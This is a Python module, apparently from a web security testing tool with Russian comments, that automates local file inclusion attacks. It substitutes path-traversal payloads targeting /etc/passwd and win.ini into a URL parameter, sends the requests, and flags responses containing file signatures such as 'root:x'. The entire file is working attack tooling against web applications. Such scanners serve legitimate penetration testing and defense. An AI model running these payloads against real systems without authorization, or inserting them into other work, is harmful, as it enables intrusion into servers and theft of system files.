# xss_security_gui/lfi_tester.py
import time
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from xss_security_gui.settings import settings


# -----------------------------------------
# LFI payloads (можно расширять в settings)
# -----------------------------------------
DEFAULT_LFI_PAYLOADS = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "..%2f..%2fetc%2fpasswd",
    "..\\..\\windows\\win.ini",
    "/etc/passwd",
    "..%252f..%252fetc%252fpasswd",
]


# -----------------------------------------
# Вспомогательные функции
# -----------------------------------------
def build_lfi_url(base_url: str, param: str, payload: str) -> str:
    """Формирует URL с подменённым параметром для LFI."""
    parsed = urlparse(base_url)
    query = parse_qs(parsed.query)

    if param not in query:
        return None

    query[param] = [payload]
    new_query = urlencode(query, doseq=True)

    return urlunparse((
        parsed.scheme,
        parsed.netloc,
        parsed.path,
        parsed.params,
        new_query,
        parsed.fragment
    ))


def is_suspicious_content(text: str) -> bool:
    """Проверяет, содержит ли ответ признаки успешного LFI."""
    text = text.lower()

    signatures = settings.LFI_SIGNATURES or [
        "root:x",          # /etc/passwd
        "[extensions]",    # win.ini
        "[fonts]",
        "[drivers]"
    ]

    return any(sig in text for sig in signatures)


# -----------------------------------------
# Основной LFI‑тестер
# -----------------------------------------
def test_lfi_payloads(
    base_url: str,
    param: str = "file",
    payloads: list[str] | None = None,
    delay: float | None = None,
    timeout: int | None = None
):
    """
    Проверяет LFI уязвимость путём подстановки вредоносных payload'ов.
    Возвращает список результатов.
    """

    if not base_url or not param:
        raise ValueError("URL и параметр должны быть указаны")

    payloads = payloads or settings.LFI_PAYLOADS or DEFAULT_LFI_PAYLOADS
    delay = delay if delay is not None else settings.LFI_DELAY
    timeout = timeout if timeout is not None else settings.REQUEST_TIMEOUT

    results = []

    for payload in payloads:
        full_url = build_lfi_url(base_url, param, payload)
        if not full_url:
            continue

        try:
            resp = requests.get(full_url, timeout=timeout)
            content = resp.text

            suspicious = is_suspicious_content(content)

            results.append({
                "url": full_url,
                "payload": payload,
                "status": resp.status_code,
                "length": len(content),
                "suspicious": suspicious
            })

        except Exception as e:
            results.append({
                "url": full_url,
                "payload": payload,
                "status": "ERR",
                "length": 0,
                "suspicious": False,
                "error": str(e)
            })

        time.sleep(delay)

    return results


# -----------------------------------------
# Тестовый запуск
# -----------------------------------------
if __name__ == "__main__":
    base = "https://example.com/view.php?file=readme.txt"

    test_results = test_lfi_payloads(base, param="file")

    for res in test_results:
        mark = "✅" if res["suspicious"] else "⚠️"
        print(f"{mark} {res['url']} | status={res['status']} | len={res['length']}")
        if "error" in res:
            print(f"   ❌ Error: {res['error']}")